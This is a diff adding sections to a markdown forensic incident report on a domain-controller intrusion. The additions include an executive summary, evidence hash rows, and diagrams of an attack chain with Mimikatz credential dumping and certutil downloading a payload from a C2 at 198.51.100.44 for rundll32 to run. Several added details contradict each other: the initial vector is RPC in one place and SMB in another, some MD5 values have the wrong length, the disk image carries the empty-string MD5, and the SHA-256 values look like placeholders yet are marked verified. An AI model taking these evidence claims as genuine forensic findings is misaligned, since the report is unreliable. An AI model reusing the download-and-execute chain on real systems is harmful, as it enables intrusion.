@@ -19,6 +19,17 @@ At approximately **02:14:22 UTC** on September 11, 2026, automated threat-detect
 
 Subsequent triage isolated the affected workstation and memory capture `MEM-2026-0911-01.raw` was performed at 02:40:00 UTC prior to host shutdown.
 
+### Executive Summary
+
+::: {.kpi-grid}
+- **Compromised Asset:** `DC-CORP-01` (Primary Domain Controller)
+- **Threat Actor:** UNC-2026 / ZAWOOO Affiliate
+- **Initial Vector:** Exploitation of exposed RPC service (`T1190`)
+- **Dwell Time:** 26 minutes (02:14:22 – 02:40:00 UTC)
+- **Investigation Verdict:** Containment Successful // Zero Exfiltration Confirmed
+- **Evidence Integrity:** 100% Verified (SHA-256 Hash Match)
+:::
+
 ---
 
 ## 2. Chain of Custody & Evidence Registry
@@ -45,12 +56,32 @@ Verification Target: Forensic Disk Image EVID-01 (evidence_dc_corp_01.dd)
 | `evidence_dc_corp_01.dd` | `a3c5f891b24d78e3105cf4e819b7d206f4a38751e1293a5b67cd10f92b84e031` | `d41d8cd98f00b204e9800998ecf8427e` | <span class="badge badge-success">VERIFIED</span> |
 | `mem_dump_01.raw` | `7d8e9a2b4c1f0e3d5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f` | `445a6c12b9d834a9812f00a5d29e71ab` | <span class="badge badge-success">VERIFIED</span> |
 | `payload_drop.bin` | `5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8` | `8f14e45fceea167a5a36dedd4bea2543` | <span class="badge badge-critical">MALICIOUS</span> |
+| `ntdll_bk.dll` | `c8a14b3f8902d1e2e3f4a5b6c7d8e9f01a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d` | `9b2c3d4e5f6a7b8c` | <span class="badge badge-critical">MALICIOUS</span> |
+| `network_pcap_01.pcap` | `1f2e3d4c5b6a7890123456789abcdef0123456789abcdef0123456789abcdef0` | `1122334455667788` | <span class="badge badge-success">VERIFIED</span> |
 
 ---
 
 ## 3. Incident Timeline & Forensic Reconstruction
 
 The timeline was constructed through correlated analysis of the `$MFT`, Windows Event Logs (`Security.evtx`, `System.evtx`), and memory volatility artifacts.
+
+``` {.mermaid #fig-attack-chain caption="Figure 1: Reconstruction of the Attacker Intrusion & Lateral Movement Kill-Chain"}
+flowchart TD
+    subgraph Perimeter["Perimeter Breach"]
+        A["198.51.100.44<br/>(External Attacker)"] -->|"Exploit SMB 445/TCP"| B["DC-CORP-01<br/>spoolsv.exe"]
+    end
+
+    subgraph Privilege["Execution & PrivEsc"]
+        B -->|"Spawn Child"| C["powershell.exe"]
+        C -->|"Inject LSASS"| D["Mimikatz Sekurlsa"]
+    end
+
+    subgraph Impact["Staging & Impact"]
+        D -->|"Dump Hashes"| E["Domain Admin Account"]
+        E -->|"Create Task"| F["WinUpdateSync<br/>(Persistence)"]
+        F -->|"Archive Staging"| G["fin_export_2026.enc"]
+    end
+```
 
 | Timestamp (UTC) | Event Classification | Host / Source | Observation & Analysis |
 |---|---|---|---|
@@ -89,6 +120,22 @@ Register-ScheduledTask -TaskName "\Microsoft\Windows\Maint\WinUpdateSync" -Actio
 ```
 
 > **WARNING**: The binary disguise `ntdll_bk.dll` was placed into `C:\Windows\Temp\`. Static analysis revealed UPX compression and encrypted import tables.
+
+``` {.mermaid #fig-payload-staging caption="Figure 2: Execution and Staging Sequence of Malicious Scheduled Task"}
+sequenceDiagram
+    autonumber
+    participant T as Task Scheduler
+    participant C as certutil.exe
+    participant A as Attacker C2 (198.51.100.44)
+    participant R as rundll32.exe
+
+    T->>C: Launch certutil.exe with URL cache
+    C->>A: HTTP GET /stage2.dll
+    A-->>C: 200 OK (ntdll_bk.dll payload)
+    C->>T: Saved payload to C:\Windows\Temp\
+    T->>R: Spawn rundll32.exe ntdll_bk.dll,Init
+    R->>R: Unpack UPX & Inject Shellcode
+```
 
 ### 4.2 Forensic Memory Ingestion & Hash Parsing Script
 
